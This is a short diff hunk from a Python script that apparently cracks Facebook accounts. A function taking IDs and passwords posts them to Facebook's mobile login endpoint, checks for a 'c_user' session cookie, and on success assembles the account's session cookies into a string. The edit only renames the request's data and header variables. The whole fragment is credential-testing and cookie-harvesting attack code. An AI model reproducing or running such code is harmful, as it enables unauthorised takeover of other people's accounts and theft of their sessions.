@@ -861,7 +861,7 @@ def m1(ids,pwv):
     'Referer': 'https://p.facebook.com/',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-            response=session.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = data,headers = headers,allow_redirects = False)
+            response=session.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
